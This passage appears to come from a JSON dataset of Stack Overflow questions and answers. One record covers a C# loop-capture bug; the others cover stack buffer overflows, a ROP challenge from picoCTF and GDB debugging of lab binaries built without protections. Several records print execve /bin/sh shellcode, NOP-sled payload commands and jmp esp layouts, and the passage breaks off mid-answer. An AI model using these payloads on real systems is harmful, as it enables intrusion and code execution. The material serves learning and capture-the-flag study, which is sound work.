Task.Run(parallelAction);\n            else\n                parallelAction();\n        }\n\n\n        this.Reporting(callTimes, httpErrors);\n    }\n    catch (Exception err)\n    {\n        txtErrors.ThreadSafeAppendText($\"Error while running stress test : \\r\\n\" + err.Message);\n    }\n}\n\nThe strange thing i don't understand is how the variable called currentIndex become >= executions variable, because only the loop manipulate those two variable and should enforce the opposite.\nSo i think i am missing something in my understanding on how parallel processing happen here.\n",
        "Answer": "There is a fairly well known issue with capturing loop variables.\nSo you should probably write\nfor ( int index = 0; index < executions; index++)\n{\n    int currentIndex = index;\n    Action parallelAction = () =>\n    {\n        ...\n\nAnother possible issue:\nparameters[randoms[currentIndex] % parametersCount];\n\nFor all you know the values in randoms could all be zero. Are you sure you don't want to create an array of 0..executions, and shuffle this instead?\nI can't see any obvious reasons why this example should fail however. But errors with indices etc should be rather obvious if you do some debugging.\n",
        "Source": "https://stackoverflow.com/questions/76874536/index-overflow-in-for-loop-with-nested-thread"
    },
    {
        "Title": "Not getting the expected output when running a shell code in a buffer overflow",
        "Question": "After finding the eip offset i'm trying to input some shell code to my program. With the following command run $(python -c 'print(\"A\"*108 + \"BBBB\")') i get the following output\nProgram received signal SIGSEGV, Segmentation fault.\n0x42424242 in ?? ()\n\nNow the problem occurs when i try to add my shell code. When i input\nrun $(python -c 'print(\"\\x90\"*63 + \"\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" + \"B\" * 20)')\n\ni don't get what i was exepected, the return address being overwritten with B's, but i get the following\nProgram received signal SIGSEGV, Segmentation fault.\n0x90c290c2 in ?? ()\n\nIt does work, when i increase the number of B's to 48 and decrease the number of NOPs to 35, but i'm not quite understanding why this doesn't work with more NOPs and less B's for the return address. One other thing i do not understand is that i'm not seeing any NOPs in my stack.\n(gdb) x/200x $esp\n0xffffd2a0: 0x42424242  0x42424242  0x42424242  0x42424242\n0xffffd2b0: 0x42424242  0x42424242  0x42424242  0x42424242\n0xffffd2c0: 0x42424242  0x42424242  0x00424242  0x00000001\n0xffffd2d0: 0xffffd398  0x68e47ce5  0x9e780f0a  0x00000000\n0xffffd2e0: 0x00000000  0x00000000  0xffffd3e0  0x0804b519\n0xffffd2f0: 0x00000000  0x08049c76  0xffffd3e0  0x0804b52d\n0xffffd300: 0x00000000  0x00000000  0x00000000  0x0804968d\n0xffffd310: 0x00000040  0x0000000c  0x00000040  0x00000008\n0xffffd320: 0x00040000  0x00000040  0x00002000  0x00300000\n0xffffd330: 0x00090000  0x00040000  0x00002000  0x00008000\n0xffffd340: 0xffffd370  0xffffd3d4  0x00000002  0x00000001\n0xffffd350: 0x00000006  0x00000045  0x00000001  0x00300000\n0xffffd360: 0x000c0000  0x00000004  0x00000001  0x00000000\n0xffffd370: 0xffffffff  0x00000000  0x080e3620  0x00000000\n0xffffd380: 0x00000000  0x00000000  0xffffd3b0  0x080e3ff4\n0xffffd390: 0x00000002  0x00000000  0x00000000  0x08049688\n0xffffd3a0: 0x00000000  0x00000000  0x00000000  0x08049688\n0xffffd3b0: 0x0804968d  0x00000002  0xffffd3d4  0x00000000\n0xffffd3c0: 0x00000000  0x00000000  0xffffd3cc  0x00000000\n0xffffd3d0: 0x00000002  0xffffd5d2  0xffffd609  0x00000000\n0xffffd3e0: 0xffffd6a5  0xffffd6b5  0xffffd6c9  0xffffd6ff\n0xffffd3f0: 0xffffd70c  0xffffd746  0xffffd773  0xffffd78a\n0xffffd400: 0xffffd79e  0xffffd7d1  0xffffd80f  0xffffd826\n0xffffd410: 0xffffd83e  0xffffd881  0xffffd891  0xffffd89d\n0xffffd420: 0xffffd8bd  0xffffd8cc  0xffffd8ff  0xffffd90a\n0xffffd430: 0xffffd925  0xffffd93a  0xffffd94f  0xffffd95e\n0xffffd440: 0xffffd97e  0xffffd9ac  0xffffd9bb  0xffffd9c4\n0xffffd450: 0xffffda14  0xffffda22  0xffffda33  0xffffda48\n0xffffd460: 0xffffda60  0xffffda6c  0xffffdaf0  0xffffdb01\n0xffffd470: 0xffffdb35  0xffffdb64  0xffffdbb0  0xffffdbbf\n0xffffd480: 0xffffdbd4  0xffffdbeb  0xffffdc09  0xffffdc1d\n0xffffd490: 0xffffdc25  0xffffdc3b  0xffffdc6d  0xffffdc78\n0xffffd4a0: 0xffffdc80  0xffffdc99  0xffffdcb4  0xffffdcbf\n0xffffd4b0: 0xffffdcd0  0xffffdcef  0xffffdd21  0xffffdd35\n0xffffd4c0: 0xffffdd53  0xffffdd6a  0xffffdd83  0xffffdda1\n0xffffd4d0: 0xffffde16  0xffffde2c  0xffffde3c  0xffffdf08\n0xffffd4e0: 0xffffdf1a  0xffffdf50  0xffffdf6c  0xffffdf84\n0xffffd4f0: 0xffffdf9b  0x00000000  0x00000020  0xf7ffc570\n0xffffd500: 0x00000021  0xf7ffc000  0x00000033  0x000006f0\n0xffffd510: 0x00000010  0xbfebfbff  0x00000006  0x00001000\n0xffffd520: 0x00000011  0x00000064  0x00000003  0x08048034\n0xffffd530: 0x00000004  0x00000020  0x00000005  0x00000009\n0xffffd540: 0x00000007  0x00000000  0x00000008  0x00000000\n0xffffd550: 0x00000009  0x08049660  0x0000000b  0x000003e8\n0xffffd560: 0x0000000c  0x000003e8  0x0000000d  0x000003e8\n0xffffd570: 0x0000000e  0x000003e8  0x00000017  0x00000000\n0xffffd580: 0x00000019  0xffffd5bb  0x0000001a  0x00000002\n0xffffd590: 0x0000001f  0xffffdfc1  0x0000000f  0xffffd5cb\n0xffffd5a0: 0x0000001b  0x0000001c  0x0000001c  0x00000020\n0xffffd5b0: 0x00000000  0x00000000  0x62000000  0x9e72e32a\n\n\nI'm using Python 3. The shell code is 25 bytes long. I have already disabled ASLR.\nThis is my code in C\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv){\n    char buffer[100];\n    strcpy(buffer, argv[1]);\n\n    return 0;\n}\n\n",
        "Answer": "Python3's string literals \"...\" default to UTF-8 (Unicode) encoding when printing, not 8-bit ASCII (ISO-8859-1/Latin-1). As a result extra characters are being output that renders your shellcode unusable.\nIf you were to run your Python command like:\npython -c 'print(\"\\x90\"*63 + \"\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" + \"B\" * 20)' | hexdump -C\n\nPiping the output through hexdump can make the issue more obvious. The output will look something like:\n00000000  c2 90 c2 90 c2 90 c2 90  c2 90 c2 90 c2 90 c2 90  |................|\n*\n00000070  c2 90 c2 90 c2 90 c2 90  c2 90 c2 90 c2 90 c3 ab  |................|\n00000080  0b 5b 31 c3 80 31 c3 89  31 c3 92 c2 b0 0b c3 8d  |.[1..1..1.......|\n00000090  c2 80 c3 a8 c3 b0 c3 bf  c3 bf c3 bf 2f 62 69 6e  |............/bin|\n000000a0  2f 73 68 42 42 42 42 42  42 42 42 42 42 42 42 42  |/shBBBBBBBBBBBBB|\n000000b0  42 42 42 42 42 42 42 0a                           |BBBBBBB.|\n000000b8\n\nYou'll notice that the value C2 and C3 have been inserted into the middle of your code for those characters that are >= 0x80. As a result the output is no longer suitable as shellcode.\nIf you switch to using Python2 the problem would resolve itself since it doesn't default to a Unicode character set. Something that works for Python2 and Python3 is the use of byte string literals b'...' and use sys.stdout.buffer.write to output the bytes to standard output.\nA command like this should work in GDB:\nrun $(python -c \"import sys; sys.stdout.buffer.write(b'\\x90'*63 + b'\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68' + b'B' * 20)\")\n\n",
        "Source": "https://stackoverflow.com/questions/78100496/not-getting-the-expected-output-when-running-a-shell-code-in-a-buffer-overflow"
    },
    {
        "Title": "EIP doesn&#39;t get overwritten when perfoming a buffer overflow attack",
        "Question": "I was watching this video on youtube: https://www.youtube.com/watch?v=1S0aBV-Waeo and i was trying to do the same steps shown in the video, but i can't seem to overwrite the EIP. I don't know if it's because the gdb may have changed during the years, or if anything else has. What i get when i try to overflow is the following\nProgram received signal SIGSEGV, Segmentation fault.\n0x080491ac in main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n\nI can't seem to overwrite the eip, no matter how large my input is. The code is the same as shown in the video with a smaller buffer size.\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv){\n    char buffer[10];\n    strcpy(buffer, argv[1]);\n\n    return 0;\n}\n\nI also get asked the following when running my program in gdb for the first time\nThis GDB supports auto-downloading debuginfo from the following URLs:\n  <https://debuginfod.archlinux.org>\nEnable debuginfod for this session? (y or [n]) \n\nThis is the register info in gdb\n(gdb) info reg\neax            0x0                 0\necx            0xffffd6b2          -10574\nedx            0xffffd396          -11370\nebx            0x804bff4           134529012\nesp            0xffffd390          0xffffd390\nebp            0xffffd3a8          0xffffd3a8\nesi            0xffffd480          -11136\nedi            0xf7ffcb60          -134231200\neip            0x80491a3           0x80491a3 <main+61>\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n\n(gdb) x/20x $esp\n0xffffd390: 0xffffffff  0x4141d3d4  0x41414141  0x41414141\n0xffffd3a0: 0xffff0041  0xf7e1fe2c  0x00000000  0xf7c20af9\n0xffffd3b0: 0x00000000  0x00000000  0x080482e7  0xf7c20af9\n0xffffd3c0: 0x00000002  0xffffd474  0xffffd480  0xffffd3e0\n0xffffd3d0: 0xf7e1fe2c  0x0804907d  0x00000002  0xffffd474\n\nI'm compiling with the following flags\ngcc -o example2 -fno-stack-protector -no-pie -m32 -g -z execstack example2.c -w\n\nThe whole interaction on gdb\n(gdb) disassemble main\nDump of assembler code for function main:\n   0x080497d5 <+0>: lea    0x4(%esp),%ecx\n   0x080497d9 <+4>: and    $0xfffffff0,%esp\n   0x080497dc <+7>: push   -0x4(%ecx)\n   0x080497df <+10>:    push   %ebp\n   0x080497e0 <+11>:    mov    %esp,%ebp\n   0x080497e2 <+13>:    push   %ebx\n   0x080497e3 <+14>:    push   %ecx\n   0x080497e4 <+15>:    sub    $0x10,%esp\n   0x080497e7 <+18>:    call   0x804981c <__x86.get_pc_thunk.ax>\n   0x080497ec <+23>:    add    $0x9a808,%eax\n   0x080497f1 <+28>:    mov    %ecx,%edx\n   0x080497f3 <+30>:    mov    0x4(%edx),%edx\n   0x080497f6 <+33>:    add    $0x4,%edx\n   0x080497f9 <+36>:    mov    (%edx),%edx\n   0x080497fb <+38>:    sub    $0x8,%esp\n   0x080497fe <+41>:    push   %edx\n   0x080497ff <+42>:    lea    -0x12(%ebp),%edx\n   0x08049802 <+45>:    push   %edx\n   0x08049803 <+46>:    mov    %eax,%ebx\n   0x08049805 <+48>:    call   0x8049020\n   0x0804980a <+53>:    add    $0x10,%esp\n   0x0804980d <+56>:    mov    $0x0,%eax\n--Type <RET> for more, q to quit, c to continue without paging--\n   0x08049812 <+61>:    lea    -0x8(%ebp),%esp\n   0x08049815 <+64>:    pop    %ecx\n   0x08049816 <+65>:    pop    %ebx\n   0x08049817 <+66>:    pop    %ebp\n   0x08049818 <+67>:    lea    -0x4(%ecx),%esp\n   0x0804981b <+70>:    ret\nEnd of assembler dump.\n(gdb) break *0x08049805\nBreakpoint 1 at 0x8049805: file example.c, line 6.\n(gdb) break *0x08049812\nBreakpoint 2 at 0x8049812: file example.c, line 9.\n(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAA\nStarting program: /home/r3/buffer-overflows/bo in memory example/example AAAAAAAAAAAAAAAAAAAAAAAAA\n\nThis GDB supports auto-downloading debuginfo from the following URLs:\n  <https://debuginfod.archlinux.org>\nEnable debuginfod for this session? (y or [n]) \nDebuginfod has been disabled.\nTo make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.\n\nBreakpoint 1, 0x08049805 in main (argc=2, argv=0xffffd464) at example.c:6\n6       strcpy(buffer, argv[1]);\n(gdb) info reg\neax            0x80e3ff4           135151604\necx            0xffffd330          -11472\nedx            0xffffd306          -11514\nebx            0x80e3ff4           135151604\nesp            0xffffd2f0          0xffffd2f0\nebp            0xffffd318          0xffffd318\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x8049805           0x8049805 <main+48>\neflags         0x292               [ AF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0xffffd2f0: 0xffffd306  0xffffd6a4  0x00000000  0x080497ec\n0xffffd300: 0x080ade17  0x080e7c04  0x08049030  0x080ae037\n0xffffd310: 0xffffd330  0x080e3ff4  0xffffd428  0x08049ceb\n0xffffd320: 0x00000021  0xffffd338  0x00067e1c  0x08049ceb\n0xffffd330: 0x00000002  0xffffd464  0xffffd470  0xffffd354\n(gdb) c\nContinuing.\n\nBreakpoint 2, main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n(gdb) info reg\neax            0x0                 0\necx            0xffffd6b0          -10576\nedx            0xffffd312          -11502\nebx            0x80e3ff4           135151604\nesp            0xffffd300          0xffffd300\nebp            0xffffd318          0xffffd318\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x8049812           0x8049812 <main+61>\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0xffffd300: 0x080ade17  0x41417c04  0x41414141  0x41414141\n0xffffd310: 0x41414141  0x41414141  0x41414141  0x00414141\n0xffffd320: 0x00000021  0xffffd338  0x00067e1c  0x08049ceb\n0xffffd330: 0x00000002  0xffffd464  0xffffd470  0xffffd354\n0xffffd340: 0x080e3ff4  0x0804968d  0x00000002  0xffffd464\n(gdb) c\nContinuing.\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0804981b in main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n(gdb) info reg\neax            0x0                 0\necx            0x41414141          1094795585\nedx            0xffffd312          -11502\nebx            0x41414141          1094795585\nesp            0x4141413d          0x4141413d\nebp            0x41414141          0x41414141\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x804981b           0x804981b <main+70>\neflags         0x10286             [ PF SF IF RF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0x4141413d: Cannot access memory at address 0x4141413d\n(gdb) c\nContinuing.\n\nProgram terminated with signal SIGSEGV, Segmentation fault.\nThe program no longer exists.\n\n",
        "Answer": "This code\n   0x08049815 <+64>:    pop    %ecx\n   0x08049816 <+65>:    pop    %ebx\n   0x08049817 <+66>:    pop    %ebp\n   0x08049818 <+67>:    lea    -0x4(%ecx),%esp\n   0x0804981b <+70>:    ret\n\nrestores registers from their saved location on stack. However, you've overwritten the stack contents, so all the registers are now set to 0x4141... values. And that causes the lea    -0x4(%ecx),%esp instruction to SIGSEGV, since ECX points to inaccessible memory.\nAs ssbssa commented, this is happening due to stack realignment (which itself is needed to deal with 64-bit aligned (newer) AVX etc.).\nIf I turn stack realignment off with -mpreferred-stack-boundary=2, the code becomes:\n   0x08049176 <+0>:     push   %ebp\n   0x08049177 <+1>:     mov    %esp,%ebp\n   0x08049179 <+3>:     sub    $0xc,%esp\n   0x0804917c <+6>:     mov    0xc(%ebp),%eax\n   0x0804917f <+9>:     add    $0x4,%eax\n   0x08049182 <+12>:    mov    (%eax),%eax\n   0x08049184 <+14>:    push   %eax\n   0x08049185 <+15>:    lea    -0xa(%ebp),%eax\n   0x08049188 <+18>:    push   %eax\n   0x08049189 <+19>:    call   0x8049050 <strcpy@plt>\n   0x0804918e <+24>:    add    $0x8,%esp\n   0x08049191 <+27>:    mov    $0x0,%eax\n   0x08049196 <+32>:    leave\n   0x08049197 <+33>:    ret\n\nand the RIP overwrite works:\nProgram received signal SIGSEGV, Segmentation fault.\n0x41414141 in ?? ()\n(gdb) x/i $pc\n=> 0x41414141:  Cannot access memory at address 0x41414141\n\n",
        "Source": "https://stackoverflow.com/questions/78053915/eip-doesnt-get-overwritten-when-perfoming-a-buffer-overflow-attack"
    },
    {
        "Title": "Buffer Overflow: Why does buffer assignment impact other variables?",
        "Question": "\nvoid foo() {\n    int value = 0;\n    char buf[4];\n    buf[4] = 1;\n\n\n    printf(\"value: %d\\n\", value);\n}\n\nint main() {\n    foo();\n    return 0;\n}\n\n\n\nWhy does 'value' print 1?\nI believe this has to do with buffer overflow and little endian but I am finding it hard to grasp.\n",
        "Answer": "Because it is Undefined Behaviour.\nIt is enough to change the optimization options and you will get different results.\nGodbolt for example:\n\nWith -O0 : 1\nWith -Os : 0\n\nBut it does not have to be like this. It can end up in the segfault or something else may happen.\nhttps://godbolt.org/z/TEbWbMvsa\n\nI understand it's undefined behavior. I was just wondering how this is\nrelated to little endian. When I went past buf[3] into buf[4], it\nstarted changing the next byte in memory. How do I know the next byte\nin memory is 'value'?\n\nYou cant know it. Order is not specified. value can be optimized out and not stored on the stack at all. You need to know your ABI and compiler very well to predict it.\nIn your case:\n+ 0x07: value byte 4  MSB\n+ 0x06: value byte 3\n+ 0x05: value byte 2\n+ 0x04: value byte 1  LSB\n+ 0x03: buf[3]\n+ 0x02: buf[2]\n+ 0x01: buf[1]\n+ 0x00: buf[0]\n\n",
        "Source": "https://stackoverflow.com/questions/77937810/buffer-overflow-why-does-buffer-assignment-impact-other-variables"
    },
    {
        "Title": "ROP - The use of the jmp esp",
        "Question": "I was playing some picoCTF challenges today and I found myself stuck in a challenge.\nDigging around the internet, I found a solution online which I cannot fully grasp.\nThe challenge (whose name I won't spoil for those who are playing picoCTF) revolves around a vulnerable x86 ELF, and it involves using ROP gadgets to gain a shell, however the checksec reveals that the binary is not PIE, and there is no NX enabled.\nBy breaking at ret of the vulnerable function, I noticed that the EAX register contains the start address of the buffer on the stack. Moreover, I found out that the offset between the start of the buffer and the saved EIP is 28 bytes.\nSo my first guess was to craft a sufficiently short shellcode, place it inside the buffer preceeded by a NOP sled, and overwrite the saved EIP with a gadget jumping to the content of the EAX register, aka the start of my buffer.\nHowever, I found out that this approach is not working.\nThe shellcode I crafted is:\nint 0x3   ; used for debugging purposes\nxor eax, eax\npush eax\npush 0x0068732f\npush 0x6e69622f\nxor ebx, ebx\npush eax\npush ebx\nmov ecx, esp\nmov al, 0xb\nint 0x80\n\nI assembled it using pwntool's asm library, setting the architecture to i386.\nThe debugger reveals the following after few steps in:\npwndbg> \n\nProgram received signal SIGSEGV, Segmentation fault.\n0xff854a01 in ?? ()\nLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS / show-flags off / show-compact-regs off ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n EAX  0x0\n EBX  0x0\n ECX  0x80e5300 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2088\n EDX  0xff854a10 \u2014\u25b8 0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n EDI  0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n ESI  0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n EBP  0x90909090\n ESP  0xff854a00 \u25c2\u2014 0x0\n EIP  0xff854a01 \u25c2\u2014 0x2f000000\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM / i386 / set emulate on ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n   0xff8549f3    push   eax\n   0xff8549f4    push   0x68732f\n   0xff8549f9    push   0x6e69622f\n   0xff8549fe    xor    ebx, ebx\n   0xff854a00    add    byte ptr [eax], al\n    \u2193\n \u25ba 0xff854a01    add    byte ptr [eax], al\n   0xff854a03    add    byte ptr [edi], ch\n   0xff854a05    bound  ebp, qword ptr [ecx + 0x6e]\n   0xff854a08    das    \n   0xff854a09    jae    0xff854a73                    <0xff854a73>\n    \u2193\n   0xff854a73    add    byte ptr [eax], al\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n00:0000\u2502 esp eip-1 0xff854a00 \u25c2\u2014 0x0\n01:0004\u2502           0xff854a04 \u25c2\u2014 '/bin/sh'\n02:0008\u2502           0xff854a08 \u25c2\u2014 0x68732f /* '/sh' */\n03:000c\u2502           0xff854a0c \u25c2\u2014 0x0\n04:0010\u2502 edx       0xff854a10 \u2014\u25b8 0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n... \u2193              2 skipped\n07:001c\u2502           0xff854a1c \u25c2\u2014 0x3e8\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ BACKTRACE ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \u25ba f 0 0xff854a01\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\npwndbg> \n\nMeaning that the execution is breaking at 0xff854a00.\nNow the solution I found online involved crafting the overflow string in the following way:\n\nWrite 6 NOPs.\nPlace the assembled instruction for jmp esp\nWrite 20 more NOPs.\nPlace the jmp eax gadget to jump to the start of the buffer, overwriting the saved EIP.\nAppend the shellcode.\n\nFrom what I've understood, the jmp ESP instruction allows to direct the execution right after the ret instruction, thus jumping inside the shellcode, but I would like to know more about this.\nI even tried recalling the x86 Call/Return Protocol, but it seems that I cannot fully grasp how jumping to the stack would actually resolve the challenge.\nI seek your help.\nThanks!\n",
        "Answer": "Your code is on the stack under the stack pointer. Part of it is overwritten by your own push instructions. Notice that bound ebp, qword ptr [ecx + 0x6e] has machine code 62 69 6E which corresponds to push 0x6e69622f. Adjusting esp downwards by a suitable amount should fix the problem, e.g. sub esp, 32\nThe other solution works around the problem by putting most of the shellcode above the stack pointer and only using a single jmp esp to transfer control. Here is an illustration of the memory layout:\n|    ...      |           |     ^       |\n|    ...      |           |     |       |\n|    ...      |           |     |       |\n|    ...      | <= ESP => |  shellcode  |\n+-------------+           +-------------+\n|  ret addr   |  jmp eax  |  ret addr   |\n+-------------+           +-------------+\n| pushed data |           | pushed data |\n|     |       |           |     |       |\n|     |       |           |     |       |\n|     v       |           |     v       |\n|  !overlap!  |           |    ...      |\n|     ^       |           |   jmp esp   |\n|     |       |           |    nop      |\n|     |       |           |    nop      |\n|  shellcode  | <= EAX => |    nop      |\n+-------------+           +-------------+\n\nThe initial nops are probably not needed, it should work fine with the 